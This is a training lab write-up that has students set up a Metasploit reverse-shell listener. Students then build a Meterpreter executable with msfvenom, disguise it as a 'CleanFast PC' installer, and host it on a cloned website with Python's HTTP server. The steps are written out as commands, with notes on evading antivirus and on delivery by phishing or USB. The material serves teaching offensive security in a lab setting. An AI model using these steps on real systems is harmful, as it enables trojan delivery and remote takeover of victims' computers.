# Lab 1:1 - Enter Meterpreter

## Objective

*What will students achieve by the end of this lab?*

- Setup Meterpreter listener
- Create Meterpreter Payload
- Host cloned website with Meterpreter payload

---

## Estimated Time

*Approximate time to complete the lab.*

- Example: 20 minutes

---

# Step-by-Step Instructions

# Step 1: Setup Meterpreter Listener

These commands set up a listener on the Kali VM using Metasploit. It waits for a Windows target to run a reverse shell payload (we will create this in the next step), and when that happens, it gives us remote control using a Meterpreter session. When we think of Server to Client communications this is our server side component of the connection and is passively waiting for the target (client) to call back.

This setup doesn’t exploit a vulnerability instead, it’s designed to catch the callback from a payload we deliver manually (e.g., through phishing, USB, or file hosting).

1. To setup our listener lets open Metasploit by running `msfconsole` command.
    
    Command:
    
    ```bash
    msfconsole
    ```
    

![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image.png)

1. After Metasploit starts, run the following commands below  and `press enter` into the Metasploit prompt (`msf6`) to configure our listener. 

<aside>
⚠️

Ensure you update the LHOST to your Kali VM IP

</aside>

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST <Kali VM IP>
set LPORT 4444
set ExitOnSession false
exploit -j
```

Example output:

![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image%201.png)

1. What did we paste in there to configure our listener?
    
    
    | Command | Purpose |
    | --- | --- |
    | `use exploit/multi/handler` | Opens a generic payload listener module |
    | `set PAYLOAD windows/x64/meterpreter_reverse_tcp` | Defines the reverse shell type |
    | `set LHOST <Kali VM IP>` | IP where the payload should call back |
    | `set LPORT 4444` | Port to listen for incoming connections (4444 is the default port for Meterpreter) |
    | `set ExitOnSession false` | Keeps listener running for multiple sessions |
    | `exploit -j` | Starts listener in the background (job) |
2. Lets check to make sure our listener is actually listening for callbacks on port 4444
    1. Run the following command `nestat -tuln` 
    
    Command:
    
    ```bash
    netstat -tuln
    ```
    
    Example output
    
    ![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image%202.png)
    
3. In your netstat output you should now see that your Kali VM is now listening on port 4444 

![](https://media0.giphy.com/media/v1.Y2lkPTc5NDFmZGM2cTA2cTkyOXVieXV5YzUxeG1wb2lreHlyOHdrM3F3ejF6aXpxY20wbCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3o72FfM5HJydzafgUE/giphy.gif)

---

# Step 2: Create Meterpreter Payload

Metasploit offers the ability to deliver payloads in two different ways, stageless (a single serving) or staged (in multiple servings). 

What does that really mean? Lets break down the differences.

- `Stageless` payload is when a payload is delivered all at once (the entire shell payload). The problem with stageless is its easier for EDR/AVs to identify.
- **`Staged`** payload breaks up our shell into multiple smaller pieces. The first part is the stager and it makes the initial callback to the attackers machine. After the connection is established the full shell gets sent. This approach might be able to help slip by EDR/AVs. Also to note, there can be several stages that could occur before the full shell is initiated. Depends on how the attacker wants to operate.

1. This lab we will be creating a stageless payload to limit any issues and save time for the course.  Metasploit created a tool called `msfvenom` to generate custom payloads. You can create executables and scripts that when ran on the target system they will connect to a Metasploit listener (hey we have one of those 💀). Run the following command below but update the IP to your Kali VM IP.

<aside>
💡

Msfvenom combined the legacy tools msfpayload and msfencode into one tool

</aside>

Commands:

1. Ensure you are in the directory www.cleanfastpc.com before running msfvenom command. That way your payload is where it needs to be when hosting your cloned site.

```bash
cd ~/www.cleanfastpc.com
```

<aside>
⚠️

Ensure you update the LHOST to your Kali VM IP below

</aside>

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali VM IP> LPORT=4444 -f exe -o cleanfastpc_setup.exe
```

Example output:

![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image%203.png)

1. What is msfvenom doing?
    1. This command creates a Windows 64-bit reverse Meterpreter shell using Metasploit. When the created .exe file is run on a Windows machine, it will connect back to the Kali VM on port 4444 and give you a remote Meterpreter session.

| Switches | Meaning |
| --- | --- |
| `-p windows/x64/meterpreter_reverse_tcp` | Use a **stageless** 64-bit Meterpreter reverse shell payload |
| `LHOST=<Kali VM IP>` | **Setting the IP address** (Kali VM) the payload will connect back to |
| `LPORT=4444` | The **port on the Kali VM** that Metasploit is listening on |
| `-f exe` | Output format is a **Windows executable** |
| `-o cleanfastpc_setup.exe` | Save the output as `cleanfastpc_setup.exe` |
1. I am a visual type of person so, lets add a little visual on what is going on here

# Reverse TCP Communication Flow (Stageless Payload)

```markdown

+----------------------------+                         +-----------------------------+
|                            |                         |                             |
| 🖥️  Windows Target VM      |                        | 🐧 Kali VM                  |
| Runs: cleanfastpc_setup.exe|                         | Listens via Metasploit      |
|                            |                         | (Listener: LHOST/LPORT)      |
+----------------------------+                         +-----------------------------+
             |                                                   ^
             |                                                   |
             |    Reverse TCP connection to LHOST:LPORT          |
             +-------------------------------------------------->|
                                                                 |
             |                                                   |
             |   Meterpreter session established (bi-directional)|
             |<--------------------------------------------------+
                                                                 
```

## Explanation:

- When the user on the Windows target runs the generated payload (`cleanfastpc_setup.exe`), it initiates a `reverse TCP connection` to the Kali machine
- The Kali system is running a `Metasploit listener` that is listening on the specified IP and port (LHOST and LPORT).
- Once the connection is made, a `Meterpreter shell` is established, giving the attacker remote control over the target system

---

# Step 3: Host cloned website with Meterpreter payload

Now that we have our ingredients ready, lets serve them up for consumption 🫣. Metasploit has a few options we could use to host our website, such as the web delivery module that can spin up a lightweight HTTP server and host up our payloads, but lets do it ourself. Python offers the same type of capability and its only a single command to start up. I am not saying I am lazy or anything 🙄 lol, but this is only one command compared to a few from Metasploit. 

1. Change directories to the cloned site we created in Lab 1:0  and list out the files in it. We want to double check we have all 4 files in there before serving up our website.
    
    Command:
    
    ```bash
     cd ~/www.cleanfastpc.com && ls -hal
    ```
    

Example Output:

![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image%204.png)

<aside>
💡

If you don't have your Meterpreter binary in here you can move it into this directory or while in the directory rerun the msfvenom command linked here: [msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali VM IP> LPORT=4444 -f exe -o cleanfastpc_setup.exe](Lab%201%201%20-%20Enter%20Meterpreter%2024f86e25cbe58192b9f1ca931ced23a2.md) 

</aside>

1. Now that we double checked everything is in order, what does the Python HTTP server do? When we start Python’s HTTP server it host everything that is the current working directory. It is also great for quickly sharing files if you are in a pinch. Run the following command to start it
    
    Command: 
    
    ```bash
    python -m http.server 80
    ```
    
    Example output:
    
    ![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image%205.png)
    
2. You can take a look at all your hard work by placing your mouse cursor and hovering over http://0.0.0.0:80/ in the output, hold down ctrl and left clicking on it to open your site. Additionally you can open up Firefox and type in `http://0.0.0.0/`

![image.png](Lab%201%201%20-%20Enter%20Meterpreter/image%206.png)

1. Click on the `Download CleanFast PC` button to verify you can download your payload `cleanfastpc_setup.exe`
2. Lets get poppin

![](https://media0.giphy.com/media/v1.Y2lkPTc5NDFmZGM2NmFxY2V6MGhiNWhjMXFhZm44ZGtnajNyejIweWtzaGp4MTBsMXdmbCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/km3qr3vNHEdPHamqMH/giphy.gif)

---

## Next Steps

*What comes after this lab?*

- [Lab 1:2 - Pop Pop Pop](Lab%201%202%20-%20Pop%20Pop%20Pop.md)

---

## References

- Metasploit: https://docs.metasploit.com/docs/using-metasploit/basics/
- Msfvenom: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- Metepreter: https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html

 © 2026 DEATHGroup Labs LLC. All rights reserved.
